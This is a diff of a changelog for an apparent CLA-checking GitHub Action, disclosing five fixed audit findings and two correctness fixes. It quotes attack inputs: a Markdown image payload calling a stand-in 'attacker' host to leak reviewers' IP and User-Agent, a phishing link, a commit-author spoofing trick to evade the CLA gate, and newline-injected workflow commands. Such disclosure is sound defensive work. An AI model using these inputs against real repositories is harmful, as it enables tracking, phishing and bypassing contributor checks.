@@ -165,14 +165,25 @@ These M6 items aren't on the critical path for v3.0 and ship later:
 
 ### Security
 
-Four findings from a pre-release security audit, all introduced in upstream's v2.x lineage and fixed before v3.0.0 ships:
+Five findings from two pre-release security audits, all introduced in upstream's v2.x lineage and fixed before v3.0.0 ships:
+
+- **SEC-DEDUP-NAME-COLLISION** (Medium, surfaced in audit pass 2). `getCommitters` deduplicated commits by `user.name`, where `name = committer.login || committer.name`. Resolved commits got a GitHub login (alphanumeric+hyphen); unresolved commits got the raw git author header — fully attacker-controlled. Both namespaces collapsed into the same dedup set. An external contributor could `git commit --author "<signed-login> <unclaimed-email>"` to silently collide with a resolved signer's name, causing the unresolved committer to be dropped from the CLA check. The action would then see only the legitimate signed contributor, pass the gate, and the attacker's commits would land merged with no CLA recorded. Dedup key now composes from `id` (for resolved committers) or `(name, email)` (for unresolved), keeping the two namespaces cleanly separated.
+
+The original four:
 
 - **SEC-COMMENT-AUTHOR-FILTER** (Medium). The bot's existing-PR-comment lookup matched comment bodies only, never the author. A PR opener could paste the legacy brand substring `Self-Hosted CLA Assistant bot` (or even reconstruct the per-job hidden marker — workflow + job names are public in the consumer's yaml) into a comment of their own. The action would adopt that attacker comment as "its own," fail to `updateComment` on it (GitHub rejects edits to others' comments), and `setFailed` — permanently blocking the PR until a maintainer manually deleted the decoy. The lookup is now filtered by the authenticated identity (`github-actions[bot]` under `GITHUB_TOKEN`, `<app-slug>[bot]` under App auth; one extra API call per run, memoized).
 - **SEC-PAGINATE-COMMITS** (Medium). The GraphQL committers query requested `commits(first: 100, after: $cursor)` and asked for `pageInfo`, but called the API exactly once with `cursor: ''` and never looped on `hasNextPage`. PRs with more than 100 commits silently dropped later-position committers from the CLA check — both an integrity gap on legitimate large PRs and a deliberate-bypass channel for an attacker who padded a PR with 100 trivial signed-author commits before adding unsigned-author commits past position 100. Now paginates until `hasNextPage === false`, with a 50-page (5000-commit) cap and a `core.warning` if hit.
 - **SEC-ESCAPE-AUTHOR-NAME** (Low–Medium). Unresolved-committer git author names flowed into the bot's PR comment without Markdown escaping. A crafted name like `![pixel](https://attacker/log)` would render as an image and exfiltrate every reviewer's IP and User-Agent; `[click](https://phish)` would plant a phishing link. The unresolved-committer branches (the ✗ list and the "seems not to be a GitHub user" line) now wrap names in backticks (rendered as inline code, disables Markdown), with embedded backticks stripped to prevent wrapper escape. Resolved-user names (alphanumeric+hyphen by GitHub policy) are unaffected.
 - **SEC-STRIP-NEWLINES** (Low). `logUnsignedCommitterDetails()` interpolated contributor-controlled name + email into `core.info()`. `@actions/core`'s `info()` is a thin `process.stdout.write`, so a `\n` in the value could spawn a workflow command (`::warning::`, `::error::`, `::add-mask::`, `::group::`) on the next runner-parsed line. `set-env` / `add-path` are token-protected since CVE-2020-15228 so secrets can't be exfiltrated, but bogus annotations could be sprayed onto PRs and substrings of subsequent logs could be masked. `\r` and `\n` are now stripped before interpolation.
 
-Each fix landed with a paired regression test (18 new tests total). Supply-chain audit ran in parallel and was clean — `dist/index.js` is reproducible bit-for-bit from `npm ci && npm run build`, every third-party action SHA-pin resolves, `npm audit --omit=dev` returns 0 vulnerabilities.
+Each fix landed with a paired regression test (22 new tests total). Supply-chain audit ran in parallel and was clean — `dist/index.js` is reproducible bit-for-bit from `npm ci && npm run build`, every third-party action SHA-pin resolves, `npm audit --omit=dev` returns 0 vulnerabilities.
+
+### Fixed (correctness)
+
+Two correctness fixes that emerged alongside the security pass and shipped in v3.0.0:
+
+- **Signature regex now accepts any whitespace separator (SF-1)**. Pre-fix the regex required `<literal-ASCII-space>\s*` between each word, so tab-separated and non-breaking-space-separated paste of the sign phrase silently failed. Enterprise email gateways and some IMEs convert spaces to tabs; affected contributors saw "I posted the phrase and the bot ignored me." Now uses `\s+` between words; tab, multi-space, and newline-wrapped phrases all match.
+- **`listComments` now paginates at both call sites (SF-2)**. GitHub's default page size is 30. Pre-fix, `getComment` and `signatureWithPRComment` only saw the first page — so on PRs with more than 30 comments the bot would post a duplicate "please sign" comment each run, and sign comments posted past position 30 would never be detected. Both sites now use `octokit.paginate(...)` with `per_page: 100`.
 
 ## [2.6.1] and earlier
 
